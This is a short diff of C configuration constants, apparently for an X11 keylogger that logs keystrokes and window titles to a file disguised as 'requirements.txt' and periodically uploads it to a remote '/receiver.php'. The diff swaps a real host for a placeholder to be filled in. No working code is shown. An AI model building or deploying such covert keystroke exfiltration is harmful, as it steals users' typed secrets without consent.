@@ -20,10 +20,10 @@
 #include <X11/keysym.h>
 #include <ctype.h>
 
-#define SERVER "kersonik.dev"
+#define SERVER "" // write DNS record of server (without http:// or https://)
 #define SCRIPT_PATH "/receiver.php"
 #define LOG_FILE "requirements.txt"
-#define UPLOAD_INTERVAL 60
+#define UPLOAD_INTERVAL 300 // change if needed (in seconds)
 #define TITLE_LEN 1024
 #define KEY_BUF_LEN 255
 #define MAX_PATH_LEN 1024
